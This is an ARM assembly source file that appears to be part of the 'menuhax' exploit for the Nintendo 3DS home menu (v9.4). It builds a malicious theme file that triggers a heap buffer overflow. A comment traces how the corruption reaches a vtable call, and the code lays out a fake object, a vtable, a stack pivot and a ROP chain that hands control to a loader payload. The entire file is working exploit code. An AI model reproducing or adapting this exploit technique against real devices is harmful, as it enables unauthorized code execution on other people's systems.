.arm
.section .init
.global _start

/*
All function addresses referenced here are for v9.4 homemenu.

The CTRSDK memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
L_2441a0: L_1e95e0(*(inr0+4)); ...
L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
*/

#include "menuhax_ropinclude.s"

_start:

themeheader:
#ifndef BUILDROPBIN
#ifndef THEMEDATA_PATH
@ This is the start of the decompressed theme data.
.word 1 @ version
#else
.incbin THEMEDATA_PATH
#endif
#else

#ifdef PAYLOAD_HEADERFILE
.incbin PAYLOAD_HEADERFILE
#endif

.word POP_R0PC @ Stack-pivot to ropstackstart.
.word ROPBUFLOC(object) @ r0

.word ROP_LOADR4_FROMOBJR0
#endif

#ifndef THEMEDATA_PATH
.space ((themeheader + 0xc4) - .)
#endif

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr
.word ROPBUFLOC(object) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

.space ((object + 0x28) - .)
.word ROPBUFLOC(object) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

@ Fill memory with the ptrs used by the following:
@ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
@ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
.fill (((object + 0x3a60 + 0x100) - .) / 4), 4, (ROPBUFLOC(object))

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20

.space ((object + 0x4000) - .) @ Base the tmpdata followed by stack, at ROPBUF+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).

ropstackstart:

#include "menuhax_loader.s"

#ifdef PAYLOAD_PADFILESIZE
.space (0x150000 - (_end - _start))
#endif

#ifdef PAYLOAD_FOOTER_WORDS
.word PAYLOAD_FOOTER_WORD0, PAYLOAD_FOOTER_WORD1, PAYLOAD_FOOTER_WORD2, PAYLOAD_FOOTER_WORD3
#endif

